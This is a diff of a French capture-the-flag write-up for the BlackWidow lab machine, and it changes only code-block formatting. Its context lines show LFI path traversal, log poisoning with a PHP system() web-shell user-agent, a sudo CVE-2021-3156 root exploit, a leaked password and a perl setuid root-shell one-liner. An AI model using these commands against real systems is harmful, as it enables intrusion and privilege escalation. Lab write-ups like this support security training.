@@ -15,7 +15,7 @@ Le scan Nmap nous retourne une pléthore de ports liés aux différents services
 
 Un proxy Squid tourne mais ne nous permet pas d'aller voir en interne (*curl -x http://192.168.56.25:3128/ http://localhost/* nous refuse l'accès).  
 
-```plain
+```
 $ sudo nmap -T5 -p- -sCV 192.168.56.25  
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-11 20:16 CET 
 Nmap scan report for 192.168.56.25 
@@ -79,7 +79,7 @@ ffuf -w /wordlists/files/JHADDIX_LFI.txt -u http://192.168.56.25/company/started
 
 Il faut remonter une bonne quantité de dossiers avant d'atteindre la racine :  
 
-```plain
+```
 http://192.168.56.25/company/started.php?file=../../../../../../../../../../../../../etc/passwd
 ```
 
@@ -102,7 +102,7 @@ curl -A '<?php system($_GET[chr(99)]); ?>' http://192.168.56.25/
 
 Cette fois ça fonctionne !  
 
-```plain
+```
 http://192.168.56.25/company/started.php?file=../../../../../../../../../../../../..//var/log/apache2/access.log&c=id
 ```
 
@@ -111,7 +111,7 @@ Kansas City Shuffle
 
 On peut passer directement de *www-data* à *root* via la faille sudo :  
 
-```plain
+```
 www-data@blackwidow:/tmp/CVE-2021-3156-main$ python exploit_nss.py 
 sudoedit: unable to resolve host blackwidow: Temporary failure in name resolution 
 # id 
@@ -143,7 +143,7 @@ Mais on peut voir sur le système un utilisateur *viper* qui dispose d'un fichie
 
 A première vue LinPEAS ne remonte rien d'excitant. Il y a quand même ces capabilities vides sur le binaire perl qui m'échappent :  
 
-```plain
+```
 Files with capabilities (limited to 50): 
 /usr/bin/perl = 
 /usr/bin/perl5.28.1 = 
@@ -157,7 +157,7 @@ LinPEAS donne aussi une liste de fichiers de logs auxquels on a accès et il y a
 
 Une permissions en lecture sur le véritable *auth.log* m'aurait bien aidé pour la faille d'inclusion... Voyons voir ce qu'il y a dans ce fichier.  
 
-```plain
+```
 Dec 12 16:56:46 test sshd[29560]: Failed password for invalid user ?V1p3r2020!? from 192.168.1.109 port 7090 ssh2
 ```
 
@@ -170,7 +170,7 @@ Fatality
 
 On peut donc obtenir le flag utilisateur :  
 
-```plain
+```
 viper@blackwidow:~$ cat local.txt  
 d930fe79919376e6d08972dae222526b
 ```
@@ -195,7 +195,7 @@ ls
 
 Comme vu plus tôt le binaire perl ne dispose plus de capabilities. En revanche on peut reprendre les autres commandes car le fichier *arsenic* est bien présent à l'emplacement attendu :  
 
-```plain
+```
 
 viper@blackwidow:~/backup_site/assets/vendor/weapon$ ./arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";' 
 # id 
